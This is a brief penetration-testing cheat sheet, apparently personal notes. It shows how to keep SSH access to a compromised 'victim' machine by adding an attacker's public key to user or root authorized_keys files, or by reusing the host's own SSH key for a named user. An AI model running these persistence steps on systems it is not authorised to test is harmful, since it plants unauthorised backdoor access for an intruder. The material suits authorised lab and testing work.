# Adding SSH key to Victim

### On Attacker

* Create SSH key:
  * Private key location: `/home/kali/.ssh/id_rsa`&#x20;
  * Public key location: `/home/kali/.ssh/id_rsa.pub`

```bash
ssh-keygen
```

```bash
chmod 600 /home/kali/.ssh/id_rsa
```

### On Victim

* Transfer the `/home/kali/.ssh/id_rsa.pub` to authorized\_keys file
  * Locations:
    * &#x20;`/home/user/.ssh/authorized_keys`
    * `/root/.ssh/authorized_keys`

### Logging in

```bash
$ ssh -i /home/kali/id_rsa user@host
```

## ORRRR IF SSH KEY ALR EXISTS ON THE COMPROMISED MACHINE --> ADD USER'S AUTHORIZED KEYS --> SSH AS USER

```bash
cat /etc/ssh/ssh_host_rsa_key.pub >> /home/pete@complyedge.com/.ssh/authorized_keys
# Private key: /etc/ssh/ssh_host_rsa_key
```





